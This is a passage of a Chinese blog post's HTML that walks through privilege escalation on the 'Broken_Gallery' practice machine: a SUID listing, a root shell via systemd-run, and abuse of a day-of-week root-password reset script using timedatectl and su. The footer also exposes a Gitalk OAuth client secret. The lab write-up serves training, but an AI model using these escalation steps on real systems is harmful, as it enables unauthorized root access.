-rwsr-xr-x   1 root     root        14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1<br>     4851     44 -rwsr-xr--   1 root     messagebus    42992 Apr  1  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   135504     20 -rwsr-xr-x   1 root     root          18664 Mar 10  2016 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox<br>      740    420 -rwsr-xr-x   1 root     root         428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br>   393321    140 -rwsr-xr-x   1 root     root         142032 Feb 17  2016 /bin/ntfs-3g<br>   393346     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping<br>   393393     28 -rwsr-xr-x   1 root     root          27608 Apr 13  2016 /bin/umount<br>   393309     40 -rwsr-xr-x   1 root     root          40152 Apr 13  2016 /bin/mount<br>   393373     40 -rwsr-xr-x   1 root     root          40128 Mar 29  2016 /bin/su<br>   393272     32 -rwsr-xr-x   1 root     root          30800 Mar 11  2016 /bin/fusermount<br>   393347     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6<br></code></pre></td></tr></table></figure>
+
+<p>尝试 helper 提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">broken@ubuntu:/etc$ systemd-run -t bash<br>==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===<br>Authentication is required to manage system services or other units.                                                                                                                                                                        <br>Authenticating as: Broken,,, (broken)<br>Password: <br>==== AUTHENTICATION COMPLETE ===<br>Running as unit run-u42.service.                                                                                                                                                                                                            <br>Press ^] three <span class="hljs-built_in">times</span> within 1s to disconnect TTY.<br>root@ubuntu:/<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure>
+
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>这里需要对敏感文件进行查看 <code>.bash_history</code>, <code>.viminfo</code>，无论其中是否有敏感信息都需要查看，对自己的要求不能降低</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">broken@ubuntu:~$ <span class="hljs-built_in">ls</span> -liah<br>total 124K<br>152057 drwxr-xr-x 17 broken broken 4.0K Aug  9  2019 .<br>131074 drwxr-xr-x  3 root   root   4.0K Aug  9  2019 ..<br>152710 -rw-------  1 broken broken 3.6K Jan  1  2018 .bash_history<br>152060 -rw-r--r--  1 broken broken  220 Aug  9  2019 .bash_logout<br>152058 -rw-r--r--  1 broken broken 3.7K Aug  9  2019 .bashrc<br>262259 drwx------ 14 broken broken 4.0K Aug  9  2019 .cache<br>281447 drwx------ 17 broken broken 4.0K Aug  9  2019 .config<br>290964 drwx------  3 root   root   4.0K Aug  9  2019 .dbus<br>281429 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Desktop<br>133504 -rw-r--r--  1 broken broken   25 Aug  9  2019 .dmrc<br>281443 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Documents<br>281430 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Downloads<br>152059 -rw-r--r--  1 broken broken 8.8K Aug  9  2019 examples.desktop<br>283212 drwx------  2 broken broken 4.0K Aug  9  2019 .gconf<br>282694 drwx------  3 broken broken 4.0K Aug  9  2019 .gnupg<br>133509 -rw-------  1 broken broken  636 Aug  9  2019 .ICEauthority<br>281655 drwx------  3 broken broken 4.0K Aug  9  2019 .<span class="hljs-built_in">local</span><br>152663 drwx------  4 broken broken 4.0K Aug  9  2019 .mozilla<br>281444 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Music<br>281445 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Pictures<br>152061 -rw-r--r--  1 broken broken  675 Aug  9  2019 .profile<br>281441 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Public<br>133508 -rw-r--r--  1 broken broken    0 Aug  9  2019 .sudo_as_admin_successful<br>281440 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Templates<br>281446 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Videos<br>152728 -rw-------  1 broken broken 5.3K Aug  8  2019 .viminfo<br>133506 -rw-------  1 broken broken   51 Aug  9  2019 .Xauthority<br>152745 -rw-------  1 broken broken 1.3K Aug  9  2019 .xsession-errors<br>133507 -rw-------  1 broken broken 1.3K Aug  8  2019 .xsession-errors.old<br></code></pre></td></tr></table></figure>
+
+<p>实际上如果没有 gtfobins，这里靶机本身设计的提权思路并不是 timedatectl shell，从.viminfo 和 .bash_history 中可以看到一个特殊的文件 <code>./password-policy.sh</code>，查看内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">broken@ubuntu:~$ <span class="hljs-built_in">cat</span> /etc/init.d/password-policy.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br>DAYOFWEEK=$(<span class="hljs-built_in">date</span> +<span class="hljs-string">&quot;%u&quot;</span>)<br><span class="hljs-built_in">echo</span> DAYOFWEEK: <span class="hljs-variable">$DAYOFWEEK</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$DAYOFWEEK</span>&quot;</span> -eq 4 ]<br><span class="hljs-keyword">then</span><br>        sudo sh -c <span class="hljs-string">&#x27;echo root:TodayIsAgoodDay | chpasswd&#x27;</span><br><span class="hljs-keyword">fi</span><br><br><br><br><span class="hljs-comment">#if [ &quot;$DAYOFWEEK&quot; == 4 ]</span><br></code></pre></td></tr></table></figure>
+
+<p>这里代码意为当周四的时候，将 root 的密码改为 TodayIsAgoodDay</p>
+<p>我们可以通过 <code>sudo timedatectl set-time &#39;2023-06-29&#39;</code> 来修改当前时间，使用 <code>sudo reboot</code> 来重启，最后 ssh 重新登录 broken 用户，<code>su</code> 命令使用上述密码切换为root</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Broken_Gallery 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/06/909fcb140cd3.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/15e7bb7309ab.html" title="DPWWN_1靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DPWWN_1靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/3bf613bad65c.html" title="my_file_server_1 靶机">
+                        <span class="hidden-mobile">my_file_server_1 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'cdfe3c5ee1968c8ff5c379e5e590bd86'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
